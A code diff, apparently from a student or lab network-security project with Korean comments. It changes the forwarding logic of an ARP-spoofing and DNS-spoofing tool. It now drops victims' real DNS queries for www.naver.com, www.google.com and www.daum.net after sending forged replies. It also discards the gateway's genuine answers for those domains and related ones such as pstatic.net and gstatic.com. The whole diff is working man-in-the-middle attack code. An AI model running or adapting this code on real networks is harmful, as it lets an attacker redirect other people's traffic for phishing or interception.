@@ -13,6 +13,11 @@ using namespace std;
 
 #define DNS_PORT 53
 
+/* TODO
+ * https요청도 DROP 해야함
+ * 현재 왜 daum이 /flush하면 되는지 모르겠음
+*/
+
 PacketForwarder::PacketForwarder(pcap_t* handle, const ArpSpoofer* spoofer)
     : handle(handle), spoofer(spoofer), running(false) {}
 
@@ -117,47 +122,65 @@ void PacketForwarder::forward_packet(const u_int8_t* packet_data, size_t packet_
             udp_header* udp = (udp_header*)(new_packet + sizeof(struct ether_header) + ip_header_len);
             u_int16_t sport = ntohs(udp->uh_sport);
             u_int16_t dport = ntohs(udp->uh_dport);
-
-            // DNS 요청
+            
+            // DNS 요청 (클라이언트 -> 서버)
             if (dport == DNS_PORT && !ip_equals(src_ip, spoofer->get_gateway_ip())) {
                 uint8_t* dns_ptr = (uint8_t*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                 size_t dns_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                 std::string domain = extract_domain_name(dns_ptr, dns_len);
+                
+                // 도메인 정규화
                 for (auto &c : domain) c = tolower(c);
                 if (!domain.empty() && domain.back() == '.')
                     domain.pop_back();
-
+                    
                 bool should_spoof = (domain == "www.naver.com" || domain == "www.google.com" || domain == "www.daum.net");
-
+                
                 if (should_spoof) {
                     cout << "스푸핑 대상 도메인: " << domain << endl;
+                    
+                    // 스푸핑된 응답 전송
                     send_dns_spoof_response(handle, new_packet, packet_len,
                         spoofer->get_attacker_mac(), spoofer->get_gateway_ip(),
                         domain, spoofer->get_targets());
                     
-
-                    // 원본도 전달 (실제 응답 무시용)
-                    if (pcap_sendpacket(handle, new_packet, packet_len) != 0)
-                        cerr << "DNS 쿼리 패킷 포워딩 실패: " << pcap_geterr(handle) << "\n";
+                    // 원본 요청은 드롭하여 실제 서버에 도달하지 않도록 함
+                    cout << "DNS 요청 패킷 (" << domain << ") DROP." << endl;
                     delete[] new_packet;
                     return;
                 }
             }
-            // DNS 응답 (서버 → 클라이언트)
+            // DNS 응답 (서버 -> 클라이언트)
             else if (sport == DNS_PORT && ip_equals(src_ip, spoofer->get_gateway_ip())) {
                 uint8_t* dns_ptr = (uint8_t*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
                 size_t dns_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
-
-                if (dns_len >= 3 && (dns_ptr[2] & 0x80)) {
-                    std::string domain = extract_domain_name(dns_ptr, dns_len);
-                    for (auto &c : domain) c = tolower(c);
-                    if (!domain.empty() && domain.back() == '.')
-                        domain.pop_back();
-
-                    if (domain == "www.naver.com" || domain == "www.google.com" || domain == "www.daum.net") {
-                        cout << "게이트웨이 DNS 응답 (" << domain << ") DROP." << endl;
-                        delete[] new_packet;
-                        return;
+                
+                // 최소한의 헤더 체크 (응답 플래그가 설정된 경우)
+                if (dns_len >= sizeof(dns_header)) {
+                    dns_header* dns_hdr = (dns_header*)dns_ptr;
+                    
+                    // 응답 플래그 확인 (0x8000)
+                    if ((ntohs(dns_hdr->flags) & 0x8000)) {
+                        std::string domain = extract_domain_name(dns_ptr, dns_len);
+                        cout << "DNS 응답 도메인 추출: " << domain << "\n";
+                        
+                        // 도메인 정규화
+                        for (auto &c : domain) c = tolower(c);
+                        if (!domain.empty() && domain.back() == '.')
+                            domain.pop_back();
+                        
+                        // 더 넓은 범위로 체크 (서브 도메인 포함)
+                        if (domain.find("naver.com") != std::string::npos ||
+                            domain.find("pstatic.net") != std::string::npos || 
+                            domain.find("google.com") != std::string::npos ||
+                            domain.find("gstatic.com") != std::string::npos || 
+                            domain.find("daum.net") != std::string::npos) {
+                            cout << "게이트웨이 DNS 응답 (" << domain << ") DROP." << endl;
+                            delete[] new_packet;
+                            return;
+                        }
+                        else 
+                        cout << "게이트웨이 DNS 응답 (" << domain << ") ALLOW." << endl;
                     }
                 }
             }
